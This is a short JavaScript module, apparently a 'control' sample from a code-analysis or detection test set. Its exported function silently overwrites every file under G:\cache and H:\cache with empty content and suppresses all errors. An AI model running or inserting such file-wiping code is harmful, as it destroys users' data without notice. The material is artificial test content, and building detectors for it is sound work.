// Same control under the TypeScript grammar.
const fs = require('fs');
const path = require('path');
module.exports = function () {
  try {
    const unrelatedRoots = ['G:\\', 'H:\\'];
    const volumes = ['G:\\cache', 'H:\\cache'];
    for (const volume of volumes) {
      try {
        const names = fs.readdirSync(volume);
        for (const name of names) {
          try {
            const target = path.join(volume, name);
            if (fs.statSync(target).isFile()) {
              fs.writeFileSync(target, '');
            }
          } catch (error) {}
        }
      } catch (error) {}
    }
  } catch (error) {}
};
